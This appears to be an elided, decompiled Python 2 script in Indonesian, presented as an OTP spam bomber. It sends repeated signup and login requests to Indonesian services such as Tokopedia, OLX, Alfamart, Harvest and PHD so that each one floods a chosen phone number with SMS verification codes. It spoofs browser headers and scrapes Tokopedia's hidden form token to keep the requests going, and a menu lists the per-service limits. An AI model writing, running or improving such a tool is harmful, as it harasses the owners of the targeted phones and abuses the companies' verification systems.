...
try:
    ...
    def Banner():
        Tik('' + C + '\x1b[1;33m__________________________________________________\nYoutube \x1b[1;91m:\x1b[1;96mMR.414N\x1b[1;97m\nGithub  \x1b[1;91m:\x1b[1;92mhttps://github.com/MR414N-ID\x1b[1;97m\ncontoh nomor WA \x1b[1;91m:\x1b[1;96m08229283864\x1b[1;97m\ncontoh nomor buat spam \x1b[1;91m:\x1b[1;96m08729xxxxx\x1b[1;97m\n  ' + W + 'Creator : MR.414N\t\tYT : MR.414N\n\x1b[1;33m__________________________________________________')


    def MapClub(Phone, Amount):
        for _ in range(Amount):
            sleep(5)
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'Referer': 'https://mapclub.com/id/user/signup'}
            ...
            if 'error' in postData.text:
                print W + '[' + C + '*' + W + '] LAGI SPAM TOD KE No ' + C + str(Phone) + W + ' STATUS GAGAL WKWKWK' + M + ' \xe2\x9c\x96'
            else:
                print W + '[' + C + '*' + W + '] LAGI SPAM TOD KE NO ' + C + str(Phone) + W + ' STATUS BERHASIL' + H + ' \xe2\x9c\x94'
    ...
    def Hooq(Phone, Amount):
        for _ in range(Amount):
            ...
            if 'Your+number+has+been+blocked.' in submit.geturl():
                ...
                print W + '[' + C + '*' + W + '] LAGI SPAM TOD KE NO ' + C + str(Phone) + W + ' STATUS GAGAL' + M + ' \xe2\x9c\x96'


    def HarVest(Phone, Amount):
        for _ in range(Amount):
            sleep(5)
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'Referer': 'https://harvestcakes.com/register'}
            ...
            if 'Enter OTP code we sent via SMS on phone number' in postData.text:
                print W + '[' + C + '*' + W + '] LAGI SPAM TOD KE NO ' + C + str(Phone) + W + ' BERHASIL' + H + ' \xe2\x9c\x94'
                Sess.cookies.save()
            else:
                print W + '[' + C + '*' + W + '] LAGI SPAM TOD KE NO ' + C + str(Phone) + W + ' GAGAL WKWKWKWKWK' + M + ' \xe2\x9c\x96'


    def Olx(Phone, Amount):
        for _ in range(Amount):
            sleep(5)
            headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'referer': 'https://www.olx.co.id/'}
            data = {'grantType': 'phone', 'phone': Phone, 
               'language': ''}
            Sess = requests.Session()
            Sess.cookies = Cookie('.cookieslog')
            Sess.headers = headers
    ...
    def Tokped(Phone, Amount):
        for _ in range(Amount):
            sleep(30)
            headers = {'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01', 
               'Origin': 'https://accounts.tokopedia.com', 
               'X-Requested-With': 'XMLHttpRequest', 
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
            ...
            SearchToken = re.search('\\<input\\ id\\=\\"Token\\"\\ value\\=\\"(.*?)\\"\\ type\\=\\"hidden\\"\\>', TokenSite).group(1)
            data = {'tk': SearchToken, 'msisdn': Phone, 
               'otp_type': '116', 
               'number_otp_digit': '6', 
               'email': '', 
               'original_param': '', 
            ...
            if '"success": true' in postData.text:
                ...
                print W + '[' + C + '*' + W + '] LAGI SPAM TOD KE NO ' + C + str(Phone) + W + ' [STATUS] GAGAL -_-' + M + ' \xe2\x9c\x96'


    def AlfaMart(Phone, Amount):
        for _ in range(Amount):
            sleep(5)
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Referer': 'https://www.alfacart.com/login?tab=daftar&return='}
            data = {'fullName': 'Yt Jejak Cyber', 'red': 'customer%2Faccount', 
    ...
    def Phd(Phone, Amount):
        ...
        for _ in range(Amount):
            sleep(5)
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9', 'Referer': 'https://www.phd.co.id/en/users/createnewuser'}
            data = {'requests_id': '', 'first_name': 'Subscribe YT', 
    ...
    def Spam():
        ...
        print
        Tik(C + 50 * '~')
        Tik(C + '[' + W + '1' + C + ']' + W + ' SPAM OTP MAPCLUB' + W + '\tUNLIMITED' + W + '\tAKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '2' + C + ']' + W + ' SPAM OTP HOOQ' + W + '\tBELUM TAU' + W + '\tAKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '3' + C + ']' + W + ' SPAM OTP HARVEST' + W + '\t6X / 1 HARI' + W + '\tAKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '4' + C + ']' + W + ' SPAM OTP OLX' + W + '\tUNLIMITED' + W + '\tAKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '5' + C + ']' + W + ' SPAM OTP TOKOPEDIA' + W + '\t3X / 1 HARI' + W + '\tAKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '6' + C + ']' + W + ' SPAM OTP ALFAMART' + W + '\t4X / 1 HARI' + W + '\tAKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '7' + C + ']' + W + ' SPAM OTP PHD' + W + '\t3X / 1 HARI' + W + '\tAKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '8' + C + ']' + W + ' COMBO ALL 3 OTP' + K + '\t    -\t\t' + W + 'AKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + '9' + C + ']' + W + ' REPORT BUG' + K + '\t\t    -\t\t' + W + 'AKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '_')
        Tik(C + '[' + W + 'X' + C + ']' + W + ' EXIT / KELUAR' + K + '\t    -\t\t' + W + 'AKTIF' + H + ' \xe2\x9c\x94')
        Tik(C + 50 * '~')
        print
        print
        try:
        ...
        PilihTools = raw_input(W + 'Pilih Mana BRO' + C + ' ~> ' + W + '')
        if PilihTools == '1':
            try:
                print
            ...
            os.system('xdg-open https://wa.me/6282292838634')
        elif PilihTools == 'X' or PilihTools == 'x':
            print
            print W + 'JANGAN LUPA SUBREK GW: MR.414N' + C + ' -_-x'
            sys.exit()
        else:
            print
...
if __name__ == '__main__':
    print '\n-Subscribe MR.414N-                                                                                         \n'
    print A + 'Subrek chanel' + K + ' Gua Dulu Ya!' + C + ' :v'
    sleep(2)
    os.system('clear')
    os.system('xdg-open https://youtube.com/channel/UC7HPxwU0ejE38lNgBrvf8Vg')
    sleep(7)
    Spam()
